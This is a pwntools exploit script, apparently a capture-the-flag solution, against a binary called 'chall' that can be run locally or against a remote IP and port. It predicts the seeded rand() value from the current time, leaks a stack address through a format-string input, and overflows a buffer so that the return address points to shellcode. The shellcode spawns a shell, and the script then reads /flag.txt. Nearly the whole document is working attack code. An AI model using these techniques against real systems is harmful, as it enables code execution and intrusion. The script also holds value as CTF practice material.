from operator import le
from pwn import *
from pwnlib.elf import ctypes

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("34.45.81.67", 16004)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
nhonks = 0x40c0
username = 0x4080

seed = int(time.time())
libc = ctypes.CDLL("libc.so.6")
libc.srand(seed)
nhonks = libc.rand() % 91 + 10


io.sendlineafter("> ", "tang")
io.sendlineafter("how many honks?", str(nhonks))

ddebug("breakrva 0x013B8\n breakrva 0x000013F0\n continue")

io.sendlineafter("what's your name again?", "%5$p--%10$p--%15$p--")

io.recvuntil("--", drop=True)
io.recvuntil("--", drop=True)
leak = int(io.recv(14), 16)
log.success("leak:-----> " + hex(leak))

len = 0x170
ret_offset = 0x2b8

shellcode = asm(shellcraft.amd64.linux.sh())

payload = shellcode.ljust(len, b"\x00")
payload += p64(0)
payload += p64(leak - ret_offset)
io.sendline(payload)

io.sendline(b"cat /flag.txt")

io.interactive()
